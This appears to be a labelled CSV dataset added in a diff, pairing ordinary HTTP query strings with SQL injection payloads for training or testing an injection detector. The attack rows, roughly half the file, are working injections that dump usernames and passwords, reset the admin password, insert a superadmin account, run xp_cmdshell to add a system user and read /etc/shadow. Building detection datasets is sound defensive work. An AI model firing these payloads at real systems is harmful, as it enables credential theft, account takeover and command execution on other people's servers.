@@ -1,0 +1,97 @@
+payload,label
+GET http://<HOST>/<PATH>?product_id=882&warehouse=east,benign
+"GET http://<HOST>/<PATH>?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",attack
+POST http://<HOST>/<PATH>?username=budi&role=viewer&dept=hr,benign
+GET http://<HOST>/<PATH>?id=1 UNION SELECT NULL,NULL,NULL,user(),NULL--,attack
+GET http://<HOST>/<PATH>?lang=en&timezone=UTC&format=24h,benign
+"GET http://<HOST>/<PATH>?id=1';UPDATE users SET password='hacked' WHERE username='admin'--",attack
+POST http://<HOST>/<PATH>?ticket_id=TKT-44821&priority=high&assigned=ops,benign
+GET http://<HOST>/<PATH>?id=1 AND ORD(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>97--,attack
+GET http://<HOST>/<PATH>?page=about&section=team&format=html,benign
+"GET http://<HOST>/<PATH>?id=1')) AND SLEEP(5) AND (('xyz'='xyz",attack
+GET http://<HOST>/<PATH>?store=malang&aisle=3&shelf=B,benign
+GET http://<HOST>/<PATH>?id=1 AND UPDATEXML(9999,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--,attack
+POST http://<HOST>/<PATH>?appointment=2024-07-15&doctor_id=D882&slot=09:00,benign
+"GET http://<HOST>/<PATH>?id=1' AND IF(SUBSTR(database(),1,1)='a',SLEEP(4),0)--",attack
+GET http://<HOST>/<PATH>?playlist_id=PL9921&shuffle=true&repeat=one,benign
+GET http://<HOST>/<PATH>?id=1 UNION SELECT username,password,3,4 FROM admin_users--,attack
+GET http://<HOST>/<PATH>?class=mathematics&grade=10&semester=1,benign
+"GET http://<HOST>/<PATH>?id=1' OR ELT(1=1,SLEEP(3))--",attack
+POST http://<HOST>/<PATH>?vendor_id=V2291&invoice=INV-882&due=2024-08-01,benign
+GET http://<HOST>/<PATH>?id=0 UNION ALL SELECT NULL,CONCAT(0x7e,database(),0x7e),NULL,NULL--,attack
+GET http://<HOST>/<PATH>?campus=kediri&building=A&floor=2,benign
+"GET http://<HOST>/<PATH>?id=1';EXEC master..xp_cmdshell('net user hacker P@ss /add')--",attack
+GET http://<HOST>/<PATH>?origin=CGK&destination=SUB&date=2024-07-20,benign
+GET http://<HOST>/<PATH>?id=1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--,attack
+POST http://<HOST>/<PATH>?log_level=info&service=auth&instance=prod-1,benign
+"GET http://<HOST>/<PATH>?id=1' UNION SELECT NULL,CONCAT(table_name,0x3a,column_name) FROM information_schema.columns--",attack
+GET http://<HOST>/<PATH>?sensor_id=SN4421&unit=celsius&interval=5m,benign
+GET http://<HOST>/<PATH>?id=1 AND CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)>0--,attack
+GET http://<HOST>/<PATH>?branch=surabaya&type=savings&currency=IDR,benign
+"GET http://<HOST>/<PATH>?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)))--",attack
+POST http://<HOST>/<PATH>?promo_code=DISC10&user_id=U7721&apply=true,benign
+GET http://<HOST>/<PATH>?id=1 OR (SELECT SUBSTR(username,1,3) FROM users WHERE id=1)='adm'--,attack
+GET http://<HOST>/<PATH>?resolution=4k&codec=h265&bitrate=8000,benign
+"GET http://<HOST>/<PATH>?id=1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--",attack
+GET http://<HOST>/<PATH>?building_id=BLD-33&meter=electricity&month=6,benign
+GET http://<HOST>/<PATH>?id=1 AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)=1--,attack
+POST http://<HOST>/<PATH>?survey_id=SRV-1182&answer=agree&q=3,benign
+"GET http://<HOST>/<PATH>?id=1 UNION SELECT 1,2,3,4,5,6,7,8,group_concat(username,0x3a,password),10 FROM users--",attack
+GET http://<HOST>/<PATH>?venue=jcc&event=techfest&gate=B,benign
+GET http://<HOST>/<PATH>?id=1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64--,attack
+GET http://<HOST>/<PATH>?app=mobile&os=ios&version=17.2,benign
+"GET http://<HOST>/<PATH>?id=1') OR SLEEP(5) AND ('1'='1",attack
+POST http://<HOST>/<PATH>?parent_id=P9921&child=node_3&depth=2,benign
+GET http://<HOST>/<PATH>?id=1 AND 1=2 UNION SELECT NULL,NULL,@@datadir--,attack
+GET http://<HOST>/<PATH>?ward=cempaka&bed=12&type=vip,benign
+"GET http://<HOST>/<PATH>?id=1' AND (SELECT * FROM(SELECT(SLEEP(2)))a) AND '1'='1",attack
+GET http://<HOST>/<PATH>?driver_id=DRV-772&shift=morning&route=R4,benign
+GET http://<HOST>/<PATH>?id=1 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 3--,attack
+POST http://<HOST>/<PATH>?task_id=TSK-3392&status=done&assignee=rio,benign
+"GET http://<HOST>/<PATH>?id=1' AND IF(2>1,BENCHMARK(3000000,SHA1(1)),0)--",attack
+GET http://<HOST>/<PATH>?subject=physics&topic=optics&quiz=true,benign
+GET http://<HOST>/<PATH>?id=1;SELECT UTL_FILE.FOPEN('DIR','passwd','r') FROM dual--,attack
+GET http://<HOST>/<PATH>?warehouse=gudang-b&sku=GDG-4421&qty=50,benign
+"GET http://<HOST>/<PATH>?id=1' UNION SELECT NULL,NULL,NULL,NULL,CONCAT(0x7e,user(),0x3a,database())--",attack
+POST http://<HOST>/<PATH>?payment_method=bca&va=8812309921&amount=250000,benign
+GET http://<HOST>/<PATH>?id=1 AND (CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)--,attack
+GET http://<HOST>/<PATH>?municipality=batu&district=junrejo&village=tlekung,benign
+"GET http://<HOST>/<PATH>?id=1' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",attack
+GET http://<HOST>/<PATH>?chart_type=bar&metric=revenue&period=ytd,benign
+GET http://<HOST>/<PATH>?id=1 AND SUBSTR(@@version,1,1)='5'--,attack
+POST http://<HOST>/<PATH>?patient_id=P4421&diagnosis=hypertension&icd=I10,benign
+"GET http://<HOST>/<PATH>?id=1' AND (SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 1)='admin'--",attack
+GET http://<HOST>/<PATH>?parking_zone=C&slot=22&duration=3h,benign
+GET http://<HOST>/<PATH>?id=1 UNION SELECT 1,load_file('/etc/shadow'),3--,attack
+GET http://<HOST>/<PATH>?airport=MLG&terminal=1&gate=A7,benign
+"GET http://<HOST>/<PATH>?id=1';DECLARE @v NVARCHAR(255);SET @v=CHAR(100)+CHAR(98)+CHAR(95)+CHAR(110)+CHAR(97)+CHAR(109)+CHAR(101);EXEC(@v)--",attack
+GET http://<HOST>/<PATH>?recipe_id=R7721&servings=4&unit=metric,benign
+GET http://<HOST>/<PATH>?id=1 AND MAKE_SET(1=1,(SELECT SLEEP(3)))--,attack
+POST http://<HOST>/<PATH>?form_id=F8812&field=address&value=Jl+Ijen+No.5,benign
+"GET http://<HOST>/<PATH>?id=1' AND 8=8 UNION SELECT NULL,CONCAT(schema_name),NULL FROM information_schema.schemata--",attack
+GET http://<HOST>/<PATH>?provider=telkomsel&quota=10gb&validity=30d,benign
+GET http://<HOST>/<PATH>?id=1 OR 1=1 UNION SELECT NULL,NULL,version()--,attack
+GET http://<HOST>/<PATH>?job_id=JOB-2291&applicant=U8812&stage=interview,benign
+"GET http://<HOST>/<PATH>?id=1' AND (SELECT 1 FROM(SELECT SLEEP(4))a)='1",attack
+POST http://<HOST>/<PATH>?geo=id&province=jatim&city=malang&district=blimbing,benign
+GET http://<HOST>/<PATH>?id=1 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,password FROM users--,attack
+GET http://<HOST>/<PATH>?room_type=double&floor=3&view=garden,benign
+"GET http://<HOST>/<PATH>?id=1';INSERT INTO admin(username,password,role) VALUES('ghost','pw123','superadmin')--",attack
+GET http://<HOST>/<PATH>?filter=today&type=transaction&status=pending,benign
+GET http://<HOST>/<PATH>?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT SUBSTR(password,1,8) FROM users WHERE username='admin')),1)--,attack
+POST http://<HOST>/<PATH>?device_token=fcm_xK9m2p&platform=android&notify=true,benign
+"GET http://<HOST>/<PATH>?id=1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 AND SLEEP(2)--",attack
+GET http://<HOST>/<PATH>?election_id=E2024&region=jatim&tps=221,benign
+GET http://<HOST>/<PATH>?id=1 AND LPAD(user(),1,1)>'a'--,attack
+GET http://<HOST>/<PATH>?ticket_type=vip&concert=coldplay&row=A,benign
+"GET http://<HOST>/<PATH>?id=1 UNION SELECT NULL,CONCAT(0x7e,@@global.secure_file_priv,0x7e),NULL--",attack
+POST http://<HOST>/<PATH>?chat_id=C9921&message=hello&type=text,benign
+GET http://<HOST>/<PATH>?id=1 AND (SELECT HEX(database()))>0--,attack
+GET http://<HOST>/<PATH>?semester=genap&ipk=3.7&prodi=ti&angkatan=2021,benign
+"GET http://<HOST>/<PATH>?id=1' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--",attack
+POST http://<HOST>/<PATH>?stock_code=BBCA&exchange=idx&lot=10,benign
+GET http://<HOST>/<PATH>?id=1 AND (SELECT 1 WHERE 1=1 AND SLEEP(3))--,attack
+GET http://<HOST>/<PATH>?municipality=sidoarjo&zone=industrial&permit=IMB,benign
+"GET http://<HOST>/<PATH>?id=1' AND EXPORT_SET(1,CONCAT(0x7e,database()),NULL,NULL,1)--",attack
+GET http://<HOST>/<PATH>?poi=masjid-agung&radius=500&category=mosque,benign
+GET http://<HOST>/<PATH>?id=1 UNION ALL SELECT NULL,CONCAT(user(),0x7e,@@version,0x7e,database()),NULL--,attack
